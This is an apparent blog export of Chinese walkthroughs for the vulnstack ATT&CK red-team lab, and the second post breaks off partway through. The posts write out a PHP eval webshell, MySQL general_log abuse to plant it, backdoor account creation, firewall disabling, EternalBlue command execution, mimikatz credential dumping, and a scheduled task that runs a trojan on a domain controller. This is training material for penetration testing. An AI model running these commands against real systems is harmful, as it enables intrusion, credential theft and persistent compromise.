[{"title":"ATT&CK红队评估实战靶场（一）","url":"/2023/12/25/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/","content":"<h1 id=\"零\"><a href=\"#零\" class=\"headerlink\" title=\"零\"></a>零</h1><p>第一次尝试这种渗透靶场，靶场地址：<a href=\"http://vulnstack.qiyuanxuetang.net/vuln/\">vulunstack</a></p>\n<h1 id=\"靶场搭建\"><a href=\"#靶场搭建\" class=\"headerlink\" title=\"靶场搭建\"></a>靶场搭建</h1><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322185215569.png\"></p>\n<a id=\"more\"></a>\n<hr>\n<blockquote>\n<p>Win7：密码: cys121`<br>外网192.168.47.132<br>内网 192.168.52.143</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322185305616.png\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322185311742.png\"></p>\n<hr>\n<blockquote>\n<p>Win2008 密码：cys121`<br>内网 192.168.52.138</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322185332943.png\"></p>\n<hr>\n<blockquote>\n<p>Win2003 密码:cys121`<br>内网 192.168.52.141</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322185412788.png\"></p>\n<p>经过互相ping 内网三台机器可以互相ping通</p>\n<hr>\n<blockquote>\n<p>Kali<br>外网 192.168.47.129</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322185445893.png\"></p>\n<hr>\n<blockquote>\n<p>Kali(攻击机)：外网 192.168.47.129<br>Win7(VM1)：外网192.168.47.132  内网 192.168.52.143<br>Win2003(VM2) 域成员 192.168.52.141<br>Win2008(VM3) 域控 192.168.52.138</p>\n</blockquote>\n<p>启动win7 phpstudy：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322185650430.png\"></p>\n<hr>\n<h1 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h1><p>访问win7 php网站服务：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322185733544.png\"><br>看到是php探针</p>\n<p><code>Nmap</code> 扫描开启了哪些端口：开启80端口</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322185938891.png\"><br><code>御剑</code>扫描：发现phpmyadmin</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322185955574.png\"></p>\n<p><code>dirsearch</code> 也扫到一些</p>\n<p>这里我没有扫到/yxcms/</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322190243730.png\"><br>这里可以利用网页的漏洞登录进后台进行文件编辑写入一句话getshell，这里就不说了</p>\n<hr>\n<h1 id=\"漏洞利用getshell\"><a href=\"#漏洞利用getshell\" class=\"headerlink\" title=\"漏洞利用getshell\"></a>漏洞利用getshell</h1><h2 id=\"后台Getshell\"><a href=\"#后台Getshell\" class=\"headerlink\" title=\"后台Getshell\"></a>后台Getshell</h2><p>进入/phpmyadmin</p>\n<p>默认账号密码登陆成功：root root</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322190456182.png\"><br>尝试一下用 <code>into outfile</code>执行写入一句话getshell失败：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select &quot;&lt;?php eval($_POST[shell]);?&gt;&quot; into out file &#39;&#x2F;tmp&#x2F;cyshack.php&#39;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322190609953.png\"><br>原因是写入功能未开启</p>\n<p>尝试<code>开启全局日志</code>利用getshell   </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">show variables like &#39;%general%&#39;;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322190657237.png\"></p>\n<p>可以看到功能是关闭的且回显日志文件的路径</p>\n<p>尝试开启并更改路径</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">set global general_log&#x3D;&#39;on&#39;</span><br><span class=\"line\">set global general_log_file&#x3D;&#39;C:&#x2F;phpStudy&#x2F;www&#x2F;cyshack.php&#39; </span><br></pre></td></tr></table></figure>\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322190714875.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322190941139.png\"><br>写入一句话：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select &quot;&lt;?php eval($_POST[shell]);?&gt;&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322191019424.png\"><br>蚁剑链接：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322191040921.png\"><br>成功getshell：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322191108148.png\"></p>\n<hr>\n<h2 id=\"蚁剑利用\"><a href=\"#蚁剑利用\" class=\"headerlink\" title=\"蚁剑利用\"></a>蚁剑利用</h2><p>蚁剑查询身份：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322191208119.png\"></p>\n<hr>\n<p>添加用户：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"> net user cys hongrisec@2020 &#x2F;add</span><br><span class=\"line\"></span><br><span class=\"line\">(增加一个名为cys 密码为hongrisec@2020的用户名）</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322191311967.png\"><br>查看cys用户:</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032219132539.png\"></p>\n<hr>\n<p>关闭防火墙：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322191602454.png\"></p>\n<hr>\n<h1 id=\"控制win7\"><a href=\"#控制win7\" class=\"headerlink\" title=\"控制win7\"></a>控制win7</h1><h2 id=\"获取权限\"><a href=\"#获取权限\" class=\"headerlink\" title=\"获取权限\"></a>获取权限</h2><p>有两种方法：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">木马反弹shell</span><br><span class=\"line\">SMB ms17_010</span><br></pre></td></tr></table></figure>\n\n<p>Msvemon生成木马</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322192501798.png\"><br>蚁剑上传木马</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322192513123.png\"><br>运行木马：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322192527743.png\"><br>在kali设置监听即可</p>\n<p>尝试ms17_010：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322192617703.png\"><br>攻击 拿下win7权限：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032219263189.png\"></p>\n<hr>\n<h2 id=\"提升权限\"><a href=\"#提升权限\" class=\"headerlink\" title=\"提升权限\"></a>提升权限</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Sysinfo</span><br><span class=\"line\">Getuid  (发现是administor权限)</span><br><span class=\"line\">Getsystem (获取system权限)</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://blog.csdn.net/qq_41874930/article/details/110001596\">msf的getsystem命令原理</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322192943835.png\"></p>\n<hr>\n<h2 id=\"主机密码收集\"><a href=\"#主机密码收集\" class=\"headerlink\" title=\"主机密码收集\"></a>主机密码收集</h2><p><code>Hashdump</code>：看到用户的密码哈希值</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322193048868.png\"></p>\n<p>Mimikatz：抓取明文密码<br>ps：mimikatz模块已经合并为<code>kiwi</code>模块</p>\n<p><a href=\"https://blog.csdn.net/qq_38626043/article/details/109388147\">Metasploit-进阶用户密码与mimikatz模块kiwi模块</a></p>\n<p><code>load_kiwi</code>:</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032219315449.png\"><br><code>creds_all</code> 命令直接获取密码：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322193233525.png\"></p>\n<hr>\n<h2 id=\"远程桌面连接\"><a href=\"#远程桌面连接\" class=\"headerlink\" title=\"远程桌面连接\"></a>远程桌面连接</h2><p>Nmap未开启3389</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032219364197.png\"><br>meterpreter尝试开启3389：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322193741976.png\"><br>尝试远程登录：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">rdesktop -g 1440x900 -r disk:LinuxxDisk&#x3D;&#x2F;root&#x2F;Downloads -u STU1 -p &quot;密码&quot; 192.168.47.132</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322193814844.png\"></p>\n<hr>\n<h1 id=\"内网搜集\"><a href=\"#内网搜集\" class=\"headerlink\" title=\"内网搜集\"></a>内网搜集</h1><p>ipconfig看到另外一个ip：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032219421943.png\"><br>应该是内网网段</p>\n<p>使用 <code>ipconfig /all</code> 查看 DNS 服务器：<br>发现 DNS 服务器名为 god.org</p>\n<p>查看域信息：net view</p>\n<p>查看主域信息：net view /domain</p>\n<p>网上很多搜集手段，不在说了</p>\n<hr>\n<h1 id=\"添加路由，挂socks4a代理\"><a href=\"#添加路由，挂socks4a代理\" class=\"headerlink\" title=\"添加路由，挂socks4a代理\"></a>添加路由，挂socks4a代理</h1><p>横向渗透前，先将该web服务器配置为代理服务器当作跳板机。</p>\n<h2 id=\"添加路由\"><a href=\"#添加路由\" class=\"headerlink\" title=\"添加路由\"></a>添加路由</h2><p>查看路由信息，添加路由到目标环境网络</p>\n<p><code>目的是</code>为了使得MSF能够通过Win7路由转发访问,使得msf命令能够通过win7 访问到 内网</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Run get_local_subnets   &#x2F;&#x2F;可以用此命令查看目标机器所在内网网端信息与公网网端信息。</span><br></pre></td></tr></table></figure>\n<p><code>添加内网路由</code> 使得msf6能通过win7路由转发访问内网192.168.52.0/24网段</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">run autoroute -s 192.168.52.0&#x2F;24</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322194502617.png\"></p>\n<p>这样，我们就可以通过msf 进入.52网段</p>\n<p>马上扫描52网段：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;192.168.52.0&#x2F;24</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322194849103.png\"></p>\n<p>扫描存活主机：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">use auxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032219530666.png\"></p>\n<p>内网端口信息：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032219533417.png\"></p>\n<hr>\n<h2 id=\"挂socks4a代理\"><a href=\"#挂socks4a代理\" class=\"headerlink\" title=\"挂socks4a代理\"></a>挂socks4a代理</h2><p>挂代理是为了让<code>其他工具</code>能够通过win7 ，去访问192.168.52.0/24 网段</p>\n<p>配置msf代理：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">use auxiliary&#x2F;server&#x2F;socks_proxy</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322200034597.png\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322200044762.png\"><br>run之后会<code>出现 starting...</code> ，<code>jobs</code>可以查看当前代理任务，如果<code>出现stoping...</code>，可以尝试更改 <code>SRVHOST</code>配置 或者 修改如下配置文件</p>\n<p>如果proxychains配置终端代理出现问题 修改一下文件</p>\n<p>切记打开的是<code>/etc/proxychains4.config</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322200354840.png\"></p>\n<p>设置代理成功后 使用其他工具时需要添加<code>proxychains:</code></p>\n<p>Nmap扫描 192.168.52.141</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains nmap -Pn -sT 192.168.52.141  &#x2F;&#x2F; -Pn -sT 不可少</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322200440271.png\"></p>\n<hr>\n<h1 id=\"渗透win2003-远程登录\"><a href=\"#渗透win2003-远程登录\" class=\"headerlink\" title=\"渗透win2003(远程登录)\"></a>渗透win2003(远程登录)</h1><h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p>扫描主机版本</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version </span><br></pre></td></tr></table></figure>\n\n<p> 扫描192.168.52.141系统版本信息 是win2003</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032220082548.png\"><br>nmap 扫描端口等</p>\n<hr>\n<h2 id=\"尝试攻击\"><a href=\"#尝试攻击\" class=\"headerlink\" title=\"尝试攻击\"></a>尝试攻击</h2><p>由nmap看到开放445端口<br>尝试永恒之蓝攻击win2003</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec   &#x2F;&#x2F;windows 2003 的攻击模块</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">set payload windows&#x2F;meterpreter&#x2F;bind_tcp</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322201157979.png\"><br>可以看到能获取权限但是win7直接断开连接</p>\n<p>再次尝试：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322201227714.png\"><br>依旧是：（经常性断掉win7 控制权，导致断一次我就要重新打一次）</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322201238148.png\"><br>我去！！！终于知道哪里错了</p>\n<p>得到win7权限之后 一定要首先看一下自己的权限</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Getuid</span><br><span class=\"line\">Getsystem</span><br><span class=\"line\">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp(关闭防火墙)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//202103222013504.png\"></p>\n<p>再打一次：成了但是其他命令无法执行</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322201402952.png\"><br>尝试<code>ms08-067</code>没打下来</p>\n<p>可以<code>执行一些系统权限的命令</code>，添加管理员用户尝试3389登录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command </span><br></pre></td></tr></table></figure>\n\n<p>因为开了445端口：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command</span><br><span class=\"line\">show options</span><br><span class=\"line\">set rhosts 192.168.52.141</span><br><span class=\"line\">set command net user cyshack @cys121@ &#x2F;add  #添加用户</span><br><span class=\"line\">run  #成功执行</span><br><span class=\"line\">set command net localgroup administrators cyshack &#x2F;add  #管理员权限</span><br><span class=\"line\">run  #成功执行</span><br><span class=\"line\">set command &#39;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f&#39;  &#x2F;&#x2F;开启3389端口</span><br><span class=\"line\">run #成功执行</span><br></pre></td></tr></table></figure>\n\n<p>系统权限命令：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322202013158.png\"></p>\n<p>cyshack用户：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322202107255.png\"></p>\n<p>3389：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322202121752.png\"><br>然后使用proxychains连接他的3389(cyshack用户登录)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Proxychains rdesktop 192.168.52.141 </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322202215105.png\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322202222526.png\"></p>\n<hr>\n<h1 id=\"走向win2008-C盘共享传马\"><a href=\"#走向win2008-C盘共享传马\" class=\"headerlink\" title=\"走向win2008(C盘共享传马)\"></a>走向win2008(C盘共享传马)</h1><p><a href=\"https://blog.csdn.net/qwerzxcvb123/article/details/105215372/\">msf攻击win2008实例</a></p>\n<h2 id=\"信息收集-1\"><a href=\"#信息收集-1\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p>扫描版本信息：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322202624260.png\"><br>Nmap：开启了135 和445 , 3389未开启</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322202730388.png\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322202736706.png\"><br>永恒之蓝和135端口漏洞都失败  放弃漏洞</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322202753303.png\"><br>使用命令：可添加用户</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322203010112.png\"></p>\n<hr>\n<h2 id=\"另辟蹊径\"><a href=\"#另辟蹊径\" class=\"headerlink\" title=\"另辟蹊径\"></a>另辟蹊径</h2><p>win7中得到域内用户密码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322203102841.png\"><br>这里利用 win7 向域控传一个msf马，并让域控中的马<code>定时开启</code>然后我们只需要在kali<code>设置监听</code>即可</p>\n<p>生成马：(设置反弹shell到win7的9999端口)</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322203212724.png\"><br>先win7连接域控的c盘共享</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">(shell) net use \\\\192.168.52.138\\c$ &quot;cys121&#96;&quot; &#x2F;user:&quot;administrator&quot;</span><br></pre></td></tr></table></figure>\n\n<p>查看域控的c盘资源：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">(shell) dir \\\\192.168.52.138\\c$</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322203329590.png\"><br>说明成功</p>\n<p>上传msf马到win7:</p>\n<p>(win7 meterpreter) upload </p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322203405657.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322203415382.png\"><br>将win7的马共享给域控：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">(shell) copy c:\\Windows\\System32\\cyshoumen.exe \\\\192.168.52.138\\c$</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322203448363.png\"><br>看到域控：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322203457791.png\"><br>设置一个任务计划，定时启动木马：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">schtasks &#x2F;create &#x2F;tn &quot;test&quot; &#x2F;tr C:\\cyshoumen.exe &#x2F;sc once &#x2F;st 22:14 &#x2F;S 192.168.52.138 &#x2F;RU System &#x2F;u administrator &#x2F;p &quot;cys121&#96;&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322203529642.png\"><br>设置监听：此时应该监听win7的9999端口</p>\n<p>到时间点之后会反弹shell：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032220361174.png\"><br>拿下</p>\n<hr>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://www.cnblogs.com/Ekko-z/p/12991730.html\">好文章1</a><br><a href=\"https://blog.csdn.net/rlenew/article/details/104456386\">好文章2</a><br><a href=\"https://bbs.huaweicloud.com/blogs/172136\">好文章3</a></p>\n","categories":["渗透"]},{"title":"ATT&CK红队评估实战靶场（七）","url":"/2023/12/25/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%83%EF%BC%89/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>好久没打过靶机了，<a href=\"http://vulnstack.qiyuanxuetang.net/vuln/detail/9/\">ATT&amp;CK红队评估实战靶场（七）</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//868c417143234dd29ecb57aefdc38e9e.png\"></p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>漏洞搜索与利用</p>\n<blockquote>\n<p>Laravel Debug mode RCE（CVE-2021-3129）漏洞利用<br>Docker逃逸<br>通达OA v11.3 漏洞利用<br>Linux环境变量提权<br>Redis 未授权访问漏洞<br>Linux sudo权限提升（CVE-2021-3156）漏洞利用<br>SSH密钥利用<br>Windows NetLogon 域内权限提升（CVE-2020-1472）漏洞利用<br>MS14-068漏洞利用</p>\n</blockquote>\n<a id=\"more\"></a>\n\n<h1 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h1><h2 id=\"环境配置\"><a href=\"#环境配置\" class=\"headerlink\" title=\"环境配置\"></a>环境配置</h2><p>在Vmware中新增两个虚拟网卡VMnet8、VMnet14</p>\n<p>VMnet8设为默认的NAT模式，IP段设为192.168.52.0/24；VMnet14设为仅主机模式，IP段设为192.168.93.0/24</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2fa2a12803644d3ca15fe1049600a71c.png\"></p>\n<p>将VMnet8作为第二层网络的网卡，VMnet14作为第三层网络的网卡。这样，第二层网络中的所有主机皆可以上网，但是位于第三层网络中的所有主机都不与外网相连通，不能上网</p>\n<p>攻击机kali：192.168.42.224<br>web1：192.168.42.30</p>\n<h2 id=\"服务配置\"><a href=\"#服务配置\" class=\"headerlink\" title=\"服务配置\"></a>服务配置</h2><p>DMZ区的 Ubuntu 需要启动nginx服务：</p>\n<blockquote>\n<p>redis-server /etc/redis.conf<br>/usr/sbin/nginx -c /etc/nginx/nginx.conf<br>iptables -F</p>\n</blockquote>\n<p>第二层网络的 Ubuntu需要启动docker容器：</p>\n<blockquote>\n<p>sudo service docker start<br>sudo docker start 8e172820ac78</p>\n</blockquote>\n<p>第三层网络的 Windows 7 （PC 2）需要启动通达OA：</p>\n<blockquote>\n<p>C:\\MYOA\\bin\\AutoConfig.exe</p>\n</blockquote>\n<h2 id=\"域用户信息\"><a href=\"#域用户信息\" class=\"headerlink\" title=\"域用户信息\"></a>域用户信息</h2><p>域用户账户和密码如下：</p>\n<blockquote>\n<p>Administrator：Whoami2021<br>whoami：Whoami2021<br>bunny：Bunny2021<br>moretz：Moretz2021</p>\n</blockquote>\n<blockquote>\n<p>Ubuntu 1：<br>web：web2021</p>\n</blockquote>\n<blockquote>\n<p>Ubuntu 2：<br>ubuntu：ubuntu</p>\n</blockquote>\n<blockquote>\n<p>通达OA账户：<br>admin：admin657260</p>\n</blockquote>\n<h1 id=\"外网渗透\"><a href=\"#外网渗透\" class=\"headerlink\" title=\"外网渗透\"></a>外网渗透</h1><h2 id=\"Laravel-Debug-mode-RCE漏洞利用\"><a href=\"#Laravel-Debug-mode-RCE漏洞利用\" class=\"headerlink\" title=\"Laravel Debug mode RCE漏洞利用\"></a>Laravel Debug mode RCE漏洞利用</h2><p>ip扫描</p>\n<blockquote>\n<p>nmap -T4 -sV -A 192.168.42.30 -p 1-65535</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//a8e85f92ac724c6cadfea54a77afec1a.png\"><br>开启了 22 80 81 6379端口</p>\n<p>22 ssh端口不说了，80端口是一个博客，没有什么利用点</p>\n<p>访问81端口发现是Laravel框架且版本是 <code>Laravel v8.29.0 (PHP v7.4.14)</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//a93ff3e0e06f4fd78602fe62c0ee8cf4.png\"></p>\n<p>搜索到漏洞CVE-2021-3129，Exp工具直接打一波</p>\n<p>工具：<a href=\"https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP\">laravel-CVE-2021-3129-EXP</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//b0129f34de1f4828bfe0d651d771dc0b.png\"><br>这个shell哥斯拉3.03没连接上可能要使用旧版哥斯拉才能连接，又找到一款写入一句话的工具：</p>\n<p><a href=\"https://github.com/1111one/laravel-CVE-2021-3129-EXP\">laravel-CVE-2021-3129-EXP</a></p>\n<p>成功getshell</p>\n<p>发现是docker环境</p>\n<blockquote>\n<p>hostname<br>ls -alh /.dockerenv<br>cat /proc/1/cgroup</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//1799eaddbfd442999d093acfe1c0f370.png\"></p>\n<h2 id=\"Redis未授权\"><a href=\"#Redis未授权\" class=\"headerlink\" 